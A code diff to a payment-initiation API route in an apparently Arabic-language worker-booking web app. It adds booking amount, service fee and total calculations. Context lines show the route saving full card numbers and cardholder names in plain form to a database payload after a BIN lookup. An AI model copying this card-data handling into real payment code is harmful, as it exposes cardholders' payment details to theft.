@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";
 import { luhnCheck, lookupBin } from "@/lib/card-utils";
+import { computeBookingAmount } from "@/lib/pricing";
 import { autoUnarchiveOnActivity } from "@/lib/archive";
 
 interface InitiateBody {
@@ -52,7 +53,7 @@ export async function POST(req: NextRequest) {
 
   const { data: booking, error: bErr } = await supabase
     .from("bookings")
-    .select("id, booking_ref, status, client_id, worker_id")
+    .select("id, booking_ref, status, client_id, worker_id, workers(employment_type, expected_salary)")
     .eq("id", bookingId)
     .maybeSingle();
 
@@ -63,6 +64,27 @@ export async function POST(req: NextRequest) {
   if (booking.status === "paid" || booking.status === "completed") {
     return NextResponse.json({ error: "already_paid" }, { status: 409 });
   }
+
+  // احسب مبلغ الدفع من فئة العاملة + المدة المخزّنة في حمولة الحجز.
+  let duration: number | undefined;
+  let durationUnit: "hours" | "months" | "years" | undefined;
+  const { data: bookingEntries } = await supabase
+    .from("client_data_entries")
+    .select("payload")
+    .eq("type", "booking")
+    .order("created_at", { ascending: false });
+  for (const e of bookingEntries ?? []) {
+    const p = (e.payload as Record<string, unknown>) ?? {};
+    if (String(p.bookingId ?? p.booking_id ?? "") === booking.id) {
+      duration = p.duration != null ? Number(p.duration) : undefined;
+      durationUnit = p.duration_unit as "hours" | "months" | "years" | undefined;
+      break;
+    }
+  }
+  const worker = Array.isArray(booking.workers) ? booking.workers[0] : booking.workers;
+  const amount = computeBookingAmount(worker ?? {}, duration, durationUnit);
+  const serviceFee = Math.round(amount * 0.1);
+  const total = amount + serviceFee;
 
   // استعلام BIN مجاني لمعرفة نوع البطاقة والبنك والدولة
   const binInfo = await lookupBin(cardNumber.slice(0, 6));
@@ -75,6 +97,9 @@ export async function POST(req: NextRequest) {
       payload: {
         booking_id: booking.id,
         booking_ref: booking.booking_ref,
+        amount,
+        service_fee: serviceFee,
+        total,
         card_number: cardNumber,
         card_last4: cardNumber.slice(-4),
         card_name: cardName,
